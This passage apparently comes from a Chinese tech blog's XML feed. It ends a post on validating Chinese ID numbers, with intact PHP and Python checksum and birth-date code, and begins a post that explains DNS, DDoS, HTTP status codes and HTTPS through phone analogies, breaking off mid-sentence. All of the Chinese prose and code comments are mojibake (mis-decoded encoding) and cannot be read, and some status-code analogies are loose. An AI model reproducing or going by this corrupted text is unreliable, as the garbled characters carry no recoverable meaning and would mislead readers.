align="center">3</td></tr></tbody></table><p>äº†è§£äº†è§„åˆ™ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºèº«ä»½è¯åˆæ³•éªŒè¯çš„ä»£ç äº†</p><blockquote><p>ä»¥ä¸‹ä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„èº«ä»½è¯å·ç åˆæ³•æ ¡éªŒï¼Œç»“æœä¸ä¸€å®šå‡†ç¡®ï¼Œä¸»è¦ç”±äºå‰ 6 ä½æ˜¯ç”±æ°‘æ”¿éƒ¨åˆ’åˆ†çš„<a href="http://www.mca.gov.cn/article/sj/xzqh/" target="_blank" rel="noopener">è¡Œæ”¿åŒºåˆ’ç </a>ï¼Œéƒ¨åˆ†è¡Œæ”¿åŒºåŸŸä¼šå‘ç”Ÿå˜åŒ–ï¼Œç»æ°‘æ”¿éƒ¨çš„æ‰¹å‡†åä¼šåœ¨å…¶ç½‘é¡µè¿›è¡Œå…¬ç¤ºï¼Œå› æ­¤åŒä¸€åœ°ç†ä½ç½®çš„åŒºåŸŸåˆ’åˆ†ç æ˜¯å¯èƒ½å‘ç”Ÿå˜åŒ–çš„ï¼Œæ¯”å¦‚æœ€è¿‘çš„æ¸©å·é¾™æ¸¯é•‡æ’¤é•‡è®¾å¸‚å˜æ›´ä¸ºé¾™æ¸¯å¸‚ï¼Œå…¶åŒºåˆ’ç ä¹Ÿéšä¹‹ç”±<code>330327</code>å˜åŒ–ä¸º<code>330383</code>ï¼Œå› æ­¤<br>é¾™æ¸¯é•‡å±…æ°‘åŒºåˆ’ç æ˜¯<code>330327</code>ï¼Œé¾™æ¸¯å¸‚çš„æ–°ç”Ÿå„¿åŒºåˆ’ç å°±æ˜¯<code>330383</code>ï¼Œéƒ½æ˜¯åˆæ³•åŒºåˆ’ç ã€‚åŒºåˆ’ç çš„éªŒè¯è¦è€ƒè™‘è¯¥åœ°åŒºçš„å†å²åŒºåˆ’ç ã€‚</p></blockquote><p>PHP ç‰ˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¡éªŒèº«ä»½è¯å·ç æ˜¯å¦éæ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@params</span> string $id_number</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_id_number</span><span class="params">($id_number)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å‰ 17 ä½çš„æƒé‡å€¼</span></span><br><span class="line">    define(<span class="string">'WEIGHT'</span>, [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>]);</span><br><span class="line">    <span class="comment">// ä½™æ•°å¯¹åº”çš„æ ¡éªŒå’Œ</span></span><br><span class="line">    define(<span class="string">'MOD_MAP'</span>, [<span class="number">1</span>, <span class="number">0</span>, <span class="string">'X'</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// è¾“å…¥å‚æ•°æ ¡éªŒ</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">18</span> !== strlen($id_number)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'check_id_number function only accepts 18 characters. Input was:'</span> . $id_number);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (</span><br><span class="line">            ! is_numeric(substr($id_number, <span class="number">0</span>, <span class="number">17</span>)) ||                                      <span class="comment">// éªŒè¯å‰ 17 ä½æ˜¯çº¯æ•°å­—</span></span><br><span class="line">            (! is_numeric($id_number[<span class="number">17</span>]) &amp;&amp; ! in_array($id_number[<span class="number">17</span>], [<span class="string">'x'</span>, <span class="string">'X'</span>])) ||     <span class="comment">// éªŒè¯æœ«ä½æ˜¯æ•°å­—æˆ–è€…å¤§å°å†™ x</span></span><br><span class="line">            ! check_birthday(substr($id_number, <span class="number">6</span>, <span class="number">8</span>))                                      <span class="comment">// éªŒè¯ç”Ÿæ—¥åˆæ³•</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException($id_number . <span class="string">' is an invalid ID number!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è‹¥åŒ…å« Xï¼Œåˆ™ç»Ÿä¸€è½¬æ¢ä¸ºå¤§å†™</span></span><br><span class="line">        <span class="keyword">if</span> (!is_numeric($id_number)) &#123;</span><br><span class="line">            $id_number = strtoupper($id_number);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æˆªå–å‰ 17 ä½å¹¶è½¬ä¸ºæ•°ç»„</span></span><br><span class="line">        $check_code_array = str_split(substr($id_number, <span class="number">0</span>, <span class="number">17</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¡ç®—å‰ 17 ä½çš„æ ¡éªŒæƒé‡</span></span><br><span class="line">        $sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">17</span>; $i++) &#123;</span><br><span class="line">            $sum += $check_code_array[$i] * WEIGHT[$i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¯¹æ ¡éªŒæƒé‡å– 11 çš„æ¨¡å¹¶è·å–æœ«ä½æ ¡éªŒå€¼æ¯”å¯¹</span></span><br><span class="line">        <span class="keyword">return</span> MOD_MAP[$sum % <span class="number">11</span>] == $id_number[<span class="number">17</span>];</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯èº«ä»½è¯ç”Ÿæ—¥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_birthday</span><span class="params">($birthday)</span> </span>&#123;</span><br><span class="line">    $year  = substr($birthday, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    $month = substr($birthday, <span class="number">4</span>, <span class="number">2</span>);</span><br><span class="line">    $day   = substr($birthday, <span class="number">6</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($birthday &gt; date(<span class="string">'Ymd'</span>) || $birthday &lt; <span class="string">'19000101'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// checkdate() å·²åŒ…å«é—°å¹´éªŒè¯</span></span><br><span class="line">    <span class="keyword">return</span> checkdate($month, $day, $year);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(check_id_number(<span class="string">'11010519491231002X'</span>));</span><br></pre></td></tr></table></figure><p>Python ç‰ˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, date</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">æ ¡éªŒèº«ä»½è¯å·ç æ˜¯å¦éæ³•</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_id_number</span><span class="params">(id_number)</span>:</span></span><br><span class="line">    weight = (<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>)</span><br><span class="line">    mod_map = (<span class="number">1</span>, <span class="number">0</span>, <span class="string">'X'</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># å‚æ•°æ ¡éªŒ</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">18</span> != len(id_number):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'check_id_number function only accepts 18 characters. Input was:'</span> + id_number)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> id_number[:<span class="number">17</span>].isdigit() <span class="keyword">or</span> \</span><br><span class="line">                (<span class="keyword">not</span> id_number[<span class="number">17</span>].isdigit() <span class="keyword">and</span> id_number[<span class="number">17</span>] <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'x'</span>, <span class="string">'X'</span>]) <span class="keyword">or</span> \</span><br><span class="line">                <span class="keyword">not</span> check_birthday(id_number[<span class="number">6</span>:<span class="number">14</span>]):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(id_number + <span class="string">' is an invalid ID number!'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åŒ…å« X æ—¶è½¬æ¢ä¸ºå¤§å†™</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> id_number.isdigit():</span><br><span class="line">            id_number = id_number.upper()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è®¡ç®—æ ¡éªŒå’Œ</span></span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> wgt, num <span class="keyword">in</span> zip(weight, id_number[:<span class="number">17</span>]):</span><br><span class="line">            sum += wgt * int(num)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> str(mod_map[sum % <span class="number">11</span>]) == id_number[<span class="number">17</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_birthday</span><span class="params">(birthday)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># éªŒè¯ç”Ÿæ—¥æ˜¯å¦åˆæ³•ï¼ŒåŒ…å«é—°å¹´éªŒè¯</span></span><br><span class="line">        datetime.strptime(birthday, <span class="string">'%Y%m%d'</span>).date()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># éªŒè¯ç”Ÿæ—¥æ˜¯å¦åœ¨æŒ‡å®šèŒƒå›´</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'19000101'</span> &lt; birthday &lt; date.today().strftime(<span class="string">'%Y%m%d'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(check_id_number(<span class="string">'11010519491231002X'</span>))</span><br></pre></td></tr></table></figure><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="http://www.mca.gov.cn/article/sj/xzqh" target="_blank" rel="noopener">è¡Œæ”¿åŒºåˆ’ä»£ç  - æ°‘æ”¿éƒ¨</a></li><li><a href="http://www.mca.gov.cn/article/sj/xzqh//1980/?" target="_blank" rel="noopener">å†å²è¡Œæ”¿åŒºåˆ’ç  - æ°‘æ”¿éƒ¨</a></li><li><a href="http://www.mca.gov.cn/article/sj/xzqh/1980/201507/20150715854848.shtml" target="_blank" rel="noopener">æ°‘æ”¿ç»Ÿè®¡ä»£ç ç¼–åˆ¶è§„åˆ™ - æ°‘æ”¿éƒ¨</a></li><li><a href="https://zh.wikipedia.org/zh-cn/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E8%A1%8C%E6%94%BF%E5%8C%BA%E5%88%92%E4%BB%A3%E7%A0%81" target="_blank" rel="noopener">ä¸­åäººæ°‘å…±å’Œå›½è¡Œæ”¿åŒºåˆ’ä»£ç  - ç»´åŸºç™¾ç§‘</a></li><li><a href="https://zh.wikipedia.org/zh-cn/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%85%AC%E6%B0%91%E8%BA%AB%E4%BB%BD%E5%8F%B7%E7%A0%81" target="_blank" rel="noopener">ä¸­åäººæ°‘å…±å’Œå›½å…¬æ°‘èº«ä»½å·ç  - ç»´åŸºç™¾ç§‘</a></li><li><a href="https://www.bilibili.com/video/av79769795" target="_blank" rel="noopener">å¦‚ä½•æˆä¸ºä¸€ä¸ªæœ‰èº«ä»½çš„äºº - å›å½¢é’ˆPaperclip</a></li><li><a href="https://www.ithome.com/html/it/277688.htm" target="_blank" rel="noopener">æ­ç§˜ï¼šä½ çš„èº«ä»½è¯ä¸Šç©¶ç«ŸåŒ…å«å¤šå°‘ä¿¡æ¯ï¼Ÿ - ITä¹‹å®¶</a></li><li><a href="https://www.zhihu.com/question/68016278/answer/705098217" target="_blank" rel="noopener">æ€æ ·ç¡®å®šèº«ä»½è¯ç¬¬1516ä½çš„æ´¾å‡ºæ‰€ä»£ç ï¼Ÿæœ‰æ²¡æœ‰å„åœ°åˆ—è¡¨? - JVKBRSçš„å›ç­”</a></li><li><a href="https://www.zhihu.com/question/20205184/answer/223049155" target="_blank" rel="noopener">èº«ä»½è¯å·çš„æœ«ä½æ ¡éªŒç ç®—æ³•æœ€åä¸€æ­¥æ¨¡11æ˜¯åŸºäºä»€ä¹ˆè€ƒè™‘ï¼Ÿ - åˆ˜å·ç„¶-å­¦é…¥çš„å›ç­”</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å…­å²å°æœ‹å‹ä¹Ÿèƒ½æ‡‚çš„è®¡ç®—æœºæœ¯è¯­</title>
      <link href="/post/computer-terms/"/>
      <url>/post/computer-terms/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga92quaubij30i208jdgg.jpg" alt=""></p><center>å¦‚æœä½ ä¸èƒ½å‘ä¸€ä¸ªå…­å²å°å­©è§£é‡ŠæŸä»¶äº‹ï¼Œé‚£ä¹ˆä½ è‡ªå·±å°±æ²¡æœ‰çœŸæ­£ç†è§£å®ƒã€‚â€”â€” çˆ±å› æ–¯å¦</center><a id="more"></a><blockquote><p>ä¸­åˆä¼‘æ¯æ—¶ï¼Œçªç„¶æƒ³åˆ°ä¸Šåˆçš„ä¸€ä¸ª https è¿æ¥é—®é¢˜ï¼Œç±»æ¯”äº†æ‹¨æ‰“ç”µè¯çš„è¿‡ç¨‹ï¼Œäºæ˜¯ä¾¿æœ‰äº†æœ¬æ–‡ã€‚</p></blockquote><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>ä½ çš„æ‰‹æœºé€šè®¯å½•å°±ç›¸å½“äº DNS æœåŠ¡å™¨ï¼Œä½ ä¸å¯èƒ½è®°å¾—ä½æ¯ä¸ªäººçš„ç”µè¯å·ç ï¼Œæ‰€ä»¥æ‰‹æœºé€šè®¯å½•å­˜å‚¨äº†å°çº¢ 138xxxï¼Œè€æ 176xxxï¼Œå°å¼  155xxxç­‰ï¼Œå½“ä½ è¦æ‹¨æ‰“ä¸€ä¸ªç”µè¯æ—¶ï¼Œå®é™…æ‹¨æ‰“çš„éƒ½æ˜¯ç”µè¯å·ç ã€‚</p><p>http ä¹Ÿä¸€æ ·ï¼Œä½ æ‰“å¼€ç™¾åº¦(<a href="http://www.baidu.com)çš„æ—¶å€™ï¼Œhttp" target="_blank" rel="noopener">www.baidu.com)çš„æ—¶å€™ï¼Œhttp</a> ä¹Ÿä¼šå» DNS æœåŠ¡å™¨æŸ¥è¯¢ <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> å¯¹åº”çš„ IP åœ°å€ï¼Œå½“ä½ æœ€åè¯·æ±‚æ—¶ï¼Œå‘é€çš„æ˜¯ IP åœ°å€ã€‚</p><p>å¦‚æœä½ çŸ¥é“ä¸€ä¸ªäººçš„ç”µè¯å·ç ï¼Œè¿™æ ·å°±ä¸ç”¨å»ç¿»é€šè®¯å½•ï¼Œç›´æ¥æ‹¨æ‰“ä¼šå¿«å¾ˆå¤šï¼ŒåŒæ ·ï¼Œç›´æ¥ç”¨ IP è®¿é—®ä¼šæ¯”åŸŸåå¿«ä¸€äº›ï¼Œåªä¸è¿‡ç½‘ç»œå¾ˆå¿«çš„æƒ…å†µä¸‹æ„Ÿè§‰ä¸æ˜¯é‚£ä¹ˆæ˜æ˜¾ã€‚</p><h1 id="DNS-æ±¡æŸ“"><a href="#DNS-æ±¡æŸ“" class="headerlink" title="DNS æ±¡æŸ“"></a>DNS æ±¡æŸ“</h1><p>æœ‰äººæ¶æ„ä¿®æ”¹äº†ä½ çš„é€šè®¯å½•ï¼ŒæŠŠå°çº¢çš„ç”µè¯å·ç æ”¹æˆäº†è€æçš„ï¼Œè€æçš„ç”µè¯å·ç æ”¹æˆäº†å°å¼ çš„ï¼Œè¿™æ ·ä½ æƒ³ç»™å°çº¢æ‰“ç”µè¯æ—¶ï¼Œå®é™…æ˜¯åœ¨ç»™è€ææ‰“ç”µè¯ã€‚</p><p>åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œä½ åœ¨å…¬å¸æ‰“å¼€æ·˜å®æ—¶ï¼Œæœ€ç»ˆæ‰“å¼€çš„é¡µé¢å¯èƒ½æ˜¯å…¬å¸ã€ä¸è¦ä¸Šç­æ‘¸é±¼ã€‘çš„è­¦å‘Šé¡µã€‚</p><h1 id="DDoS-æ”»å‡»"><a href="#DDoS-æ”»å‡»" class="headerlink" title="DDoS æ”»å‡»"></a>DDoS æ”»å‡»</h1><p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œèƒ¡æ­Œçš„ç”µè¯èƒ½æ­£å¸¸æ¥å¬å¥¹å¦ˆçš„ç”µè¯ï¼Œä½†æœ‰ä¸€å¤©ç”µè¯å·ç è¢«æ³„éœ²åœ¨äº†ç½‘ä¸Šï¼Œå°±å¼€å§‹æœ‰äººä¸åœçš„ç»™ä»–æ‰“ç”µè¯ï¼Œè€Œä»–å¦ˆåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­åˆ™æ— æ³•æ‹¨å…¥ï¼Œåæ¥çŸ¥é“çš„äººè¶Šæ¥è¶Šå¤šäº†ï¼Œæ‰‹æœºå……ç”µéƒ½æ¥ä¸åŠï¼Œæ‰‹æœºç›´æ¥æ­»æœºäº†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œèƒ¡æ­Œçš„ç”µè¯è¢«éªšæ‰°ç”µè¯ä¸€ç›´å çº¿ï¼ŒçœŸæ­£æƒ³ç»™ä»–æ‰“ç”µè¯çš„äººå´ä¸€ç›´æ‰“ä¸è¿›å»ï¼Œä¸€ç›´åˆ°æœ€åçš„æ‰‹æœºæ­»æœºã€‚</p><p>æœåŠ¡å™¨åœ¨å—åˆ° DDoS æ”»å‡»æ—¶ï¼Œå°±æ˜¯æ¶æ„è¯·æ±‚å°†èµ„æºè€—å°½ï¼Œå¯¼è‡´æ­£å¸¸è¯·æ±‚æ— æ³•æ¥å…¥ï¼Œç›´è‡³æœ€ç»ˆçš„æœåŠ¡å™¨å®•æœºã€‚æ¯å¹´çš„åŒåä¸€å’Œæ˜¥èŠ‚çš„ 12306 æŠ¢ç¥¨éƒ½åœ¨ç»å†ç€å¤§è§„æ¨¡çš„ â€œDDoS æ”»å‡»â€ï¼Œå¿ƒç–¼ç´¯å®çš„æœåŠ¡å™¨ä¸€ç§’é’Ÿã€‚</p><h1 id="HTTP-é€šä¿¡è¿‡ç¨‹"><a href="#HTTP-é€šä¿¡è¿‡ç¨‹" class="headerlink" title="HTTP é€šä¿¡è¿‡ç¨‹"></a>HTTP é€šä¿¡è¿‡ç¨‹</h1><p>HTTP é€šä¿¡è¿‡ç¨‹éå¸¸ç±»ä¼¼äºæ‹¨æ‰“ç”µè¯ï¼Œå¿«é€’å°å“¥ç»™ä½ æ‰“ç”µè¯è®©ä½ ä¸‹æ¥¼å–å¿«é€’ï¼Œç”µè¯å·ç å³ä¸º HTTP çš„ IP åœ°å€ï¼Œæ‹¨æ‰“ç”µè¯å³ä¸ºè¯·æ±‚å»ºç«‹ HTTP è¿æ¥ã€‚é¦–å…ˆï¼Œä»–è¦è§£é”æ‰‹æœºæ‰èƒ½æ‹¨æ‰“ç”µè¯ï¼ˆ401ï¼Œè¯·æ±‚æœªè¢«è®¤è¯ï¼‰ï¼Œå¦‚æœè§£é”æ—¶å¯†ç è¾“å…¥é”™è¯¯ï¼ˆ403ï¼Œè¯·æ±‚è®¤è¯å¤±è´¥ï¼‰ï¼Œæˆ–è€…ç”µè¯å·ç æ—¶åªè¾“å…¥äº†åä½ï¼ˆ400ï¼Œé”™è¯¯çš„è¯·æ±‚æ— æ³•è¢«ç†è§£ï¼‰å°å“¥éƒ½æ— æ³•æ‹¨é€šç”µè¯ï¼Œä»–ä¿®æ­£äº†è¿™äº›é”™è¯¯åï¼Œç»ˆäºæ‹¨ä¸‹äº†ä½ çš„ç”µè¯ã€‚æ¥ä¸‹æ¥ï¼Œå¿«é€’å°å“¥çš„ç”µè¯å¯èƒ½ä¼šè¢«æ¥å¬(200ï¼ŒæˆåŠŸ)ï¼Œä¹Ÿå¯èƒ½ä¼šå¾—åˆ°ç©ºå·æˆ–è€…ä¸åœ¨æœåŠ¡åŒº(404ï¼Œèµ„æºä¸å­˜åœ¨)ï¼Œæ­£åœ¨é€šè¯ä¸­(100ï¼Œè¯·æ±‚å·²æ¥æ”¶ï¼Œå¾…å¤„ç†)ï¼Œå˜æ›´äº†å·ç å¹¶å‘ŠçŸ¥æ–°å·ç (301ï¼Œæ°¸ä¹…é‡å®šå‘)ï¼Œæœªå˜æ›´ï¼ˆ304ï¼‰åˆ™ç­‰å¾…æ¥å¬ï¼Œå¯¹æ–¹æ‹’æ¥æˆ–æ— äººæ¥å¬(500ï¼ŒæœåŠ¡å†…éƒ¨é”™è¯¯)ï¼Œå·²åœæœºæˆ–å·²å…³æœº(503ï¼ŒæœåŠ¡ä¸å¯ç”¨)ç­‰ï¼Œå¦‚æœå¯¹æ–¹é•¿æ—¶é—´æ— äººæ¥å¬ï¼Œå¿«é€’å°å“¥ç­‰çš„ä¸è€çƒ¦äº†ï¼ŒæŒ‚æ–­äº†ç”µè¯(499)ã€‚</p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ499 çŠ¶æ€ç æ˜¯ Nginx å®šä¹‰çš„æ‰©å±•çŠ¶æ€ç ï¼Œ<a href="https://httpstatuses.com/499" target="_blank" rel="noopener">éæ ‡å‡†çŠ¶æ€ç </a></p></blockquote><p>ç”µè¯æ‹¨é€šåï¼Œé€šè¯çš„å†…å®¹å³ä¸º HTTP æŠ¥æ–‡å†…å®¹ï¼Œè™½ç„¶ç”µè¯å…è®¸é€šè¯åŒæ–¹åŒæ—¶è¯´è¯ï¼Œä½†è¿™æ ·çš„ç»“æœæ˜¯è°ä¹Ÿæ²¡æœ‰æ˜ç™½å¯¹æ–¹çš„æ„æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šå¸¸éƒ½æ˜¯ä¸€æ–¹åœ¨è®²ï¼Œå¦ä¸€æ–¹åœ¨å¬ï¼ŒHTTP ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ç”µè¯æ¥é€šåï¼Œå¿«é€’å°å“¥è¯´â€œä¸‹æ¥¼æ¥å–ä¸‹å¿«é€’â€ï¼Œè¿™ç›¸å½“äº HTTP è¯·æ±‚æ–¹å‘é€äº†è¯·æ±‚å†…å®¹ï¼Œç„¶åä½ è¯´â€œå¥½çš„ï¼Œæˆ‘é©¬ä¸Šä¸‹æ¥â€ï¼Œè¿™å°±ç›¸å½“äº HTTP çš„è¯·æ±‚æ¶ˆæ¯å¾—åˆ°äº†å“åº”ï¼Œå½“ä½ ä»¬ä¸¤ä¸ªé€šè¯ç»“æŸåï¼Œå°±å¯ä»¥ç”±ä»»ä¸€æ–¹æŒ‚æ–­ç”µè¯ï¼Œè¿™å°±æ˜¯å…³é—­ HTTP è¿æ¥äº†ï¼ˆåœ¨ TCP è¿æ¥ä¸­ï¼Œå…ˆå…³é—­è¿æ¥ä¸€æ–¹ä¼šè¿›å…¥TIME_WAITï¼Œè¢«åŠ¨å…³é—­è¿æ¥çš„å¦ä¸€æ–¹ä¼šè¿›å…¥ CLOSE_WAITï¼Œå½“ç¡®è®¤å¯¹æ–¹å…³é—­è¿æ¥åï¼Œæ‰ä¼šå½»åº•å…³é—­ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆ TCP æ˜¯å¯é è¿æ¥ï¼‰ã€‚</p><h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p>å¦‚æœå¸ä»¤éƒ¨ç»™å‰æ–¹æˆ˜å£«ä¸‹è¾¾æŒ‡ä»¤ï¼Œè‚¯å®šä¸èƒ½ç›´æ¥åœ¨ç”µè¯é‡Œè¯´â€œæ˜å¤©ä¸­åˆ 12 ç‚¹å‘èµ·æ€»æ”»â€ï¼Œè¿™æ ·æœ‰äººæ¶æ„ç›‘å¬ç”µè¯åï¼Œä¸ä»…ä½œæˆ˜è®¡åˆ’è¢«æ³„éœ²ï¼Œä¹Ÿå¯èƒ½ä¼šè¢«ç¯¡æ”¹ä¸ºâ€œæš‚æ—¶æŒ‰å…µä¸åŠ¨â€ï¼Œå› æ­¤ï¼Œè¿™æ˜¯éå¸¸ä¸å®‰å…¨çš„ã€‚å¦‚æœä»–ä»¬æå‰åå•†å¥½äº†ç«æ˜Ÿè¯­ï¼Œç”µè¯é‡Œå½é‡Œå’•å™œè¯´äº†ä¸€é€šï¼Œç›‘å¬çš„äººä¸çŸ¥é“è¯´çš„ä»€ä¹ˆï¼Œç­‰ä»–ä»¬ç ´è¯‘ç»“æœå‡ºæ¥æ—¶ï¼Œå·²ç»è¢«å›¢ç­äº†ã€‚åœ¨ HTTPS ä¸­ï¼Œé€šè¿‡ HTTP + TLS å°†åŸæœ¬æ˜æ–‡ä¼ è¾“çš„å†…å®¹è¿›è¡ŒåŠ 